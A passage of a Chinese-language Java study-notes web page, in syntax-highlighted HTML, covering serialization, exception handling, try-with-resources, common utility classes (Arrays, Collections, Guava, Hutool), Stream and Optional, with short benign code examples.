class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>object2<span class="token punctuation">)</span><span class="token punctuation">;</span>        input<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">KryoParam</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">KryoParam</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">KryoParam</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> age<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setAge</span><span class="token punctuation">(</span><span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">"KryoParam&#123;"</span> <span class="token operator">+</span>                <span class="token string">"name='"</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token char">'\''</span> <span class="token operator">+</span>                <span class="token string">", age="</span> <span class="token operator">+</span> age <span class="token operator">+</span>                <span class="token char">'&#125;'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li></ol></li></ol></li></ol><h4 id="java-serializable-接口">Java Serializable 接口</h4><ol type="1"><li>Java 序列化是 JDK 1.1 时引入的一组开创性的特性，用于将 Java对象转换为<code>字节数组</code>，便于<code>存储</code>或<code>传输</code>。此后，仍然可以将字节数组转换回Java 对象原有的状态</li><li><code>NotSerializableException</code> 异常</li><li><code>Serializable</code>接口之所以定义为空，是因为它只起到了一个标识的作用，告诉程序实现了它的对象是可以被序列化的，但真正序列化和反序列化的操作并不需要它来完成</li><li><code>static</code> 和 <code>transient</code>修饰的字段是不会被序列化的</li><li>序列化保存的是<code>对象</code>的状态，而 static修饰的字段属于<code>类</code>的状态，因此可以证明序列化并不保存<code>static</code> 修饰的字段。</li><li><code>transient</code>的中文字义为“临时的”），它可以<strong>阻止</strong>字段被序列化到文件中，在被反序列化后，<code>transient</code>字段的值被设为初始值，比如 <code>int</code> 型的初始值为0，对象型的初始值为 <code>null</code>。</li><li><code>Externalizable</code> 和 Serializable 都是用于实现 Java对象的序列化和反序列化的接口，但是它们有以下区别：<ol type="1"><li>Serializable 是 Java 标准库提供的接口，而 Externalizable 是Serializable 的<code>子接口</code></li><li>Serializable接口<strong>不需要</strong>实现任何方法，只需要将需要序列化的类<code>标记</code>为Serializable 即可，而 Externalizable 接口需要实现 writeExternal 和readExternal 两个方法</li><li>Externalizable接口提供了更高的<code>序列化控制</code>能力，可以在序列化和反序列化过程中对对象进行<code>自定义</code>的处理，如对一些敏感信息进行加密和解密。</li></ol></li><li><code>serialVersionUID</code> 被称为序列化ID，它是<strong>决定</strong> Java对象能否反序列化成功的重要因子。在反序列化时，Java 虚拟机会把字节流中的serialVersionUID 与被序列化类中的 <code>serialVersionUID</code>进行比较，如果相同则可以进行反序列化，否则就会抛出序列化版本不一致的异常</li><li>Java虚拟机是否允许反序列化，<strong>不仅</strong>取决于类路径和功能代码是否一致，还有一个非常重要的因素就是<code>序列化 ID</code>是否一致。</li><li>如果实现的是 <code>Externalizable</code> 接口，则需要在writeExternal 方法中<strong>指定</strong>要序列化的字段，与 transient关键字修饰无关</li></ol><h4 id="打印流">打印流</h4><ol type="1"><li><code>PrintStream</code> 是 OutputStream 的子类</li><li>PrintStream 类的常用方法包括：<ul><li><code>print()</code>：输出一个对象的字符串表示形式。</li><li><code>println()</code>：输出一个对象的字符串表示形式，并在末尾添加一个<code>换行符</code>。</li><li><code>printf()</code>：使用指定的<code>格式</code>字符串和参数输出格式化的字符串</li></ul></li></ol><h3 id="java-异常处理">Java 异常处理</h3><h4 id="全面解析">全面解析</h4><ol type="1"><li><p>有了异常处理机制后，程序在发生异常的时候就不会<code>中断</code>，我们可以对异常进行<strong>捕获</strong>，然后改变程序执行的流程。</p><p>除此之外，异常处理机制可以保证我们向<strong>用户</strong>提供友好的提示信息，而不是程序原生的异常信息——用户根本理解不了。</p><p>不过，站在<strong>开发者</strong>的角度，我们更希望看到原生的异常信息，因为这有助于我们更快地找到bug 的根源，反而被过度包装的异常信息会干扰我们的视线。</p></li><li><p><code>Error</code>的出现，意味着程序出现了<strong>严重</strong>的问题，而这些问题不应该再交给Java 的异常处理机制来处理，程序应该直接崩溃掉，比如说<code>OutOfMemoryError</code>，内存溢出了，这就意味着程序在运行时申请的内存大于系统能够提供的内存，导致出现的错误，这种错误的出现，对于程序来说是致命的。</p><p><code>Exception</code>的出现，意味着程序出现了一些在<strong>可控范围</strong>内的问题，我们应当采取措施进行挽救</p></li><li><p><code>NoClassDefFoundError</code>：程序在<code>编译时</code>可以找到所依赖的类，但是在<code>运行时</code>找不到指定的类文件，导致抛出该错误；原因可能是jar 包缺失或者调用了初始化失败的类。</p></li><li><p><code>ClassNotFoundException</code>：当<code>动态加载</code>Class对象的时候找不到对应的类时抛出该异常；原因可能是要加载的类不存在或者类名写错了</p></li><li><p><code>unchecked</code> 异常可以不在程序中显示处理，就像之前提到的ArithmeticException 就是的；但 <code>checked</code>异常必须<code>显式处理</code>。</p></li><li><p><code>throw</code>关键字，用于<strong>主动</strong>地抛出异常；正常情况下，当除数为 0的时候，程序会主动抛出 ArithmeticException；但如果我们想要除数为 1的时候也抛出 ArithmeticException，就可以使用 throw关键字主动地抛出异常</p></li><li><p><code>Class.forName()</code> 方法在执行的时候可能会遇到<code>java.lang.ClassNotFoundException</code>异常，一个检查型异常，如果没有做处理，IDEA就会提示你，要么在方法签名上声明，要么放在 try-catch 中</p></li><li><p>什么情况下使用 throws 而不是 try-catch 呢</p><ol type="1"><li><p>但假设有好几个类似 <code>myMethod()</code>的方法，如果为每个方法都加上 try-catch，就会显得非常繁琐</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span> args<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        <span class="token function">myMethod1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ArithmeticException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 算术异常</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NullPointerException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 空指针异常</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">myMethod1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ArithmeticException</span><span class="token punctuation">,</span> <span class="token class-name">NullPointerException</span><span class="token punctuation">&#123;</span>    <span class="token comment">// 方法签名上声明异常</span><span class="token punctuation">&#125;</span></code></pre></li><li><p>throws 关键字用于<code>声明异常</code>，它的作用和 try-catch相似；而 throw 关键字用于显式的抛出异常。</p><p>throws 关键字后面跟的是异常的<strong>名字</strong>；而 throw关键字后面跟的是异常的<strong>对象</strong></p><p>throws 关键字出现在方法签名上，而 throw 关键字出现在方法体里。</p><p>throws 关键字在声明异常的时候可以跟多个，用逗号隔开；而 throw关键字每次只能抛出一个异常。</p></li></ol></li><li><p>一个 <code>try</code> 块后面可以跟多个 <code>catch</code>块，用来捕获不同类型的异常并做相应的处理，当 try块中的某一行代码发生异常时，之后的代码就<strong>不再执行</strong>，而是会跳转到异常对应的catch 块中执行。</p><p>如果一个 try 块后面跟了多个与之关联的 catch块，那么应该把<strong>特定的异常</strong>放在前面，通用型的异常放在后面，不然编译器会提示错误。</p></li><li><p>Checked Exception通常是由于<strong>外部因素</strong>导致的问题，需要在代码中显式地处理或声明抛出。</p><p>Unchecked Exception通常是由于<strong>程序内部逻辑或数据异常</strong>导致的，可以不处理或者在需要时进行处理。</p></li><li><p>虽然知道<code>try-catch</code>会有性能影响，但是业务上不需要避讳其使用，业务实现优先（只要不是书中举例的那种逆天代码就行），非特殊情况下性能都是其次，有意识地避免大范围的<code>try-catch</code>，只catch 需要的部分即可（没把握全 catch 也行，代码安全执行第一）</p></li></ol><h4 id="深入理解-java-中的-try-with-resources">深入理解 Java 中的 trywith resources</h4><ol type="1"><li><p>在处理必须关闭的资源时，始终有限考虑使用<code>try-with-resources</code>，而不是 try–catch-finally</p></li><li><p>把要释放的资源写在 try 后的 <code>()</code>中。如果有多个资源（BufferedReader 和PrintWriter）需要释放的话，可以直接在 <code>()</code> 中添加</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">try</span> <span class="token punctuation">(</span><span class="token class-name">BufferedReader</span> br <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileReader</span><span class="token punctuation">(</span>decodePath<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token class-name">PrintWriter</span> writer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PrintWriter</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>writePath<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">String</span> str <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>str <span class="token operator">=</span>br<span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        writer<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre></li></ol><h3 id="常用工具类">常用工具类</h3><h4 id="java-scanner">Java Scanner</h4><ol type="1"><li><p><code>Scanner</code></p></li><li><p><code>nextLine()</code></p></li><li><p><code>nextInt</code></p></li><li><p>查找匹配项</p></li><li><p>useDelimiter()</p></li></ol><h4 id="arrays">Arrays</h4><ol type="1"><li><p><code>java.util.Arrays</code></p></li><li><p>创建数组</p><ol type="1"><li><p>copyOf</p></li><li><p>copyOfRange()</p></li><li><p>fill()</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> stutter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span>stutter<span class="token punctuation">,</span> <span class="token string">"沉默王二"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>stutter<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li></ol></li><li><p>比较数组</p><ol type="1"><li>equals()</li><li>Arrays.hashCode()</li></ol></li><li><p>数组排序，sort()</p></li><li><p>数组检索，数组排序后用binarySearch()</p></li><li><p>数组转流</p></li><li><p>数组转 List</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> rets <span class="token operator">=</span> <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span>intro<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li><li><p>函数式编程：setAll()</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> array <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">setAll</span><span class="token punctuation">(</span>array<span class="token punctuation">,</span> i <span class="token operator">-></span> i <span class="token operator">*</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// [0, 10, 20, 30, 40, 50, 60, 70, 80, 90]</span></code></pre></li><li><p>parallelPrefix</p></li></ol><h4 id="apache-stringutils">Apache StringUtils</h4><ol type="1"><li>判空</li><li>分割字符串</li><li>判断是否是纯数字</li><li>将集合拼接成字符串</li></ol><h4 id="objects">Objects</h4><ol type="1"><li>Objects类的主要目的是降低代码中的<code>空指针异常 (NullPointerException)</code>风险，同时提供一些非常实用的方法供我们使用</li><li><code>isNull()</code></li><li><code>requireNonNull()</code></li><li><code>equals()</code></li><li><code>hashCode()</code></li><li><code>compare()</code></li><li>deepEquals()用于比较两个<code>数组类型</code>的对象，当对象是非数组的话，行为和equals() 一致。</li></ol><h4 id="java-collections">Java Collections</h4><ol type="1"><li><p>排序</p><ol type="1"><li>reverse(List list)</li><li>shuffle(List list)</li><li>sort(List list)</li><li>sort(List list, Comparator c)</li><li>swap(List list, int i, int j)</li></ol></li><li><p>查找</p><ol type="1"><li><code>binarySearch(List list, Object key)</code>：二分查找法，前提是List 已经排序过了</li><li><code>max(Collection coll)</code>：返回最大元素</li><li><code>max(Collection coll, Comparator comp)</code>：根据自定义比较器，返回最大元素</li><li><code>min(Collection coll)</code>：返回最小元素</li><li><code>min(Collection coll, Comparator comp)</code>：根据自定义比较器，返回最小元素</li><li><code>fill(List list, Object obj)</code>：使用指定对象填充</li><li><code>frequency(Collection c, Object o)</code>：返回指定对象出现的次</li></ol></li><li><p>HashMap 是<code>线程不安全</code>的，这个我们前面讲到了。那其实ArrayList 也是线程不安全的，没法在多线程环境下使用，那 Collections工具类中提供了多个 <code>synchronizedXxx</code>方法，这些方法会返回一个同步的对象，从而解决多线程中访问集合时的安全问题</p></li><li><p>不可变集合</p><ol type="1"><li><code>emptyXxx()</code>：制造一个空的不可变集合</li><li><code>singletonXxx()</code>：制造一个只有一个元素的不可变集合</li><li><code>unmodifiableXxx()</code>：为指定集合制作一个不可变集合</li></ol></li><li><p>其他</p><ol type="1"><li><code>addAll(Collection&lt;? super T&gt; c, T... elements)</code>，往集合中添加元素</li><li><code>disjoint(Collection&lt;?&gt; c1, Collection&lt;?&gt; c2)</code>，判断两个集合是否没有交集</li></ol></li><li><p>对集合操作，除了前面说的 JDK 原生 <code>Collections</code>工具类，<code>CollectionUtils</code>工具类也很常用。</p><p>目前比较主流的是<code>Spring</code>的<code>org.springframework.util</code>包下的CollectionUtils工具类。和<code>Apache</code>的<code>org.apache.commons.collections</code>包下的CollectionUtils 工具类</p></li></ol><h4 id="hutool">Hutool</h4><ol type="1"><li><p>Hutool 的设计思想是尽量减少重复的定义，让项目中的 util包尽量少</p></li><li><p>Convert 类</p></li></ol><p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> param <span class="token operator">=</span> <span class="token string">"10"</span><span class="token punctuation">;</span><span class="token keyword">int</span> paramInt <span class="token operator">=</span> <span class="token class-name">Convert</span><span class="token punctuation">.</span><span class="token function">toInt</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> paramIntDefault <span class="token operator">=</span> <span class="token class-name">Convert</span><span class="token punctuation">.</span><span class="token function">toInt</span><span class="token punctuation">(</span>param<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></p><ol start="3" type="1"><li>日期时间</li></ol><h4 id="guava">Guava</h4><ol type="1"><li>Google开源的Java工具库，太强大了</li><li>为什么需要<code>不可变集合</code>。<ul><li>保证线程安全。在并发程序中，使用不可变集合既保证线程的安全性，也大大地增强了并发时的效率（跟并发锁方式相比）。</li><li>如果一个对象不需要支持修改操作，不可变的集合将会节省空间和时间的开销。</li><li>可以当作一个常量来对待，并且集合中的对象在以后也不会被改变。</li></ul></li></ol><h4 id="其他">其他</h4><ol type="1"><li>IpUtil：获取本机 Ip</li></ol><h3 id="新特性">新特性</h3><h4 id="java8-stream-流">Java8 Stream 流</h4><ol type="1"><li><p>创建流：<code>Arrays.stream()</code> 或者<code>Stream.of()</code> 创建流；如果是集合的话，可以直接使用<code>stream()</code> 方法创建流</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"武汉加油"</span><span class="token punctuation">,</span> <span class="token string">"中国加油"</span><span class="token punctuation">,</span> <span class="token string">"世界加油"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token class-name">Stream</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> stream <span class="token operator">=</span> <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">;</span>   stream <span class="token operator">=</span> <span class="token class-name">Stream</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span><span class="token string">"武汉加油"</span><span class="token punctuation">,</span> <span class="token string">"中国加油"</span><span class="token punctuation">,</span> <span class="token string">"世界加油"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li><li><p>操作流</p><ol type="1"><li><p>过滤</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"周杰伦"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"王力宏"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"陶喆"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"林俊杰"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Stream</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> stream <span class="token operator">=</span> list<span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span>element <span class="token operator">-></span> element<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"王"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li><li><p>映射</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"周杰伦"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"王力宏"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"陶喆"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"林俊杰"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Stream</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> stream <span class="token operator">=</span> list<span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token operator">::</span><span class="token function">length</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li><li><p>匹配</p><ol type="1"><li><p><code>anyMatch()</code>，只要有一个元素匹配传入的条件，就返回true。</p></li><li><p><code>allMatch()</code>，只有有一个元素不匹配传入的条件，就返回false；如果全部匹配，则返回 true。</p></li><li><p><code>noneMatch()</code>，只要有一个元素匹配传入的条件，就返回false；如果全部不匹配，则返回 true。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">boolean</span>  anyMatchFlag <span class="token operator">=</span> list<span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">anyMatch</span><span class="token punctuation">(</span>element <span class="token operator">-></span> element<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"王"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">boolean</span>  allMatchFlag <span class="token operator">=</span> list<span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">allMatch</span><span class="token punctuation">(</span>element <span class="token operator">-></span> element<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">boolean</span>  noneMatchFlag <span class="token operator">=</span> list<span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">noneMatch</span><span class="token punctuation">(</span>element <span class="token operator">-></span> element<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">"沉"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li></ol></li><li><p>组合：<code>reduce()</code></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Optional</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> optional <span class="token operator">=</span> list<span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token operator">-></span> a <span class="token operator">+</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Optional</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> optional1 <span class="token operator">=</span> list<span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token class-name">Integer</span><span class="token operator">::</span><span class="token function">sum</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>optional<span class="token punctuation">.</span><span class="token function">orElse</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>optional1<span class="token punctuation">.</span><span class="token function">orElse</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">int</span> reduce <span class="token operator">=</span> list<span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token operator">-></span> a <span class="token operator">+</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>reduce<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> reduce1 <span class="token operator">=</span> list<span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token operator">::</span><span class="token function">sum</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>reduce1<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li></ol></li><li><p>转换流</p><ol type="1"><li><p>既然可以把集合或者数组转成流，那么也应该有对应的方法，将流转换回去——<code>collect()</code>方法就满足了这种需求。当我们需要把一个集合按照某种规则转成另外一个集合的时候，就可以配套使用<code>map()</code> 方法和 <code>collect()</code> 方法。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> list1 <span class="token operator">=</span> list<span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token operator">::</span><span class="token function">length</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span><span class="token class-name">Collectors</span><span class="token punctuation">.</span><span class="token function">toList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li></ol></li></ol><h4 id="optional最佳指南">Optional最佳指南</h4><ol type="1"><li><p>Optional，该类提供了一种用于表示可选值而非空引用的类级别解决方案。烦透了<code>NullPointerException（NPE）</code></p></li><li><p>创建Optional对象</p><p>1）可以使用静态方法 <code>empty()</code> 创建一个空的 Optional对象</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Optional</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token 